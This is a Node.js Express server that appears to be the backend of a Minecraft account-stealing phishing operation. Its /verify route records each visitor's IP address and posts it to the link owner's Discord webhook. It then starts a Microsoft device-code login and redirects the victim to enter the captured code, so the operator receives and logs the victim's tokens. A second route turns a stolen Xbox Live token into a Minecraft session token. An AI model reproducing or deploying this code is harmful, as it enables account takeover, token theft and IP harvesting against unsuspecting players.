const express = require("express")
const axios = require("axios")
const { spawn } = require("child_process")
const { Worker } = require('worker_threads');
const { query } = require("../db/db");
const { WebhookClient } = require("discord.js");

const app = express();
// let clients = []
const cacheDir = 'xbl';
let authenticationCode = null;

app.use(express.json())

function doAuth(username, userId, clientIP) {
    const child_proces = spawn('node', ['authProcess.cjs', username, cacheDir]);
    const logBuffer = [];

    child_proces.stdout.on('data', (data) => {
        const output = data.toString();
        logBuffer.push(output);

        const codeMatch = output.match(/enter the code ([A-Z0-9]{8})/i);
        if (codeMatch && codeMatch[1]) {
            authenticationCode = codeMatch[1];
        }
    });

    child_proces.stderr.on('data', (data) => {
        const errorOutput = data.toString();
        logBuffer.push(errorOutput);
        console.error(errorOutput);
    });

    child_proces.on('close', (code) => {
        // Offload the log-saving task to a worker thread
        if (authenticationCode) {
            const logWorker = new Worker('./logWorker.js', {
                workerData: { authenticationCode, logBuffer, userId, clientIP },
            });

            logWorker.on('message', (message) => {
                if (message.error) {
                    console.error('Error saving log:', message.error);
                } else {
                    console.log('Log saved to:', message.logFilePath);
                }
            });
        }
    });
}

app.get('/refreshxbl', async (req, res) => {
    try {
        const xbl = req.query.xbl;
        const xstsUserHash = await getxstsuserhash(xbl);
        const ssid = await getssid(xstsUserHash[0], xstsUserHash[1]);
        res.send(ssid);
    } catch (error) {
        res.status(400).send("Invalid XBL Token/Token Expired/Ratelimit");
    }
});


async function getxstsuserhash(xbl) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize';
    const headers = { 'Content-Type': 'application/json', 'Accept': 'application/json' };
    const data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [xbl],
        },
        RelyingParty: 'rp://api.minecraftservices.com/',
        TokenType: 'JWT',
    };

    try {
        const response = await axios.post(url, data, { headers });
        const jsonresponse = response.data;
        return [jsonresponse.DisplayClaims.xui[0].uhs, jsonresponse.Token];
    } catch (error) {
        throw new Error(error.message);
    }
}

async function getssid(userHash, xsts) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox';
    const headers = { 'Content-Type': 'application/json' };
    const identityToken = `XBL3.0 x=${userHash};${xsts}`;
    const data = {
        identityToken,
        ensureLegacyEnabled: 'true',
    };

    try {
        const response = await axios.post(url, data, { headers });
        const jsonresponse = response.data;
        return jsonresponse.access_token;
    } catch (error) {
        throw new Error(error.message);
    }
}
function generateID() {
    var length = 8,
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
        retVal = "";
    for (var i = 0, n = charset.length; i < length; ++i) {
        retVal += charset.charAt(Math.floor(Math.random() * n));
    }
    return retVal
}

app.get('/verify/:id', async (req, res) => {
    const userId = req.params.id; // Extract userId from the route parameters
    const clientIP = req.socket.remoteAddress
    // Get the client's IP address
    let ids = await query(`SELECT * FROM links`)
    for (let id of ids) {
        if (id.link == userId) {
            let hook = new WebhookClient({ url: id.webhook })
            hook.send({
                embeds: [{
                    title: `Got a new visitor`,
                    description: `Link id: ${id.link}\nClient ip: ${clientIP}`,
                    color: 0x00ff00
                }]
            })
            const username = generateID();
            doAuth(username, userId, clientIP);

            const intervalId = setInterval(() => {
                if (authenticationCode) {
                    clearInterval(intervalId);
                    const redirectUrl = `https://login.live.com/oauth20_remoteconnect.srf?lc=1033&otc=${authenticationCode}`;
                    return res.redirect(redirectUrl);
                }
            }, 1000); // Poll every second
        }
    }
});

module.exports = { app }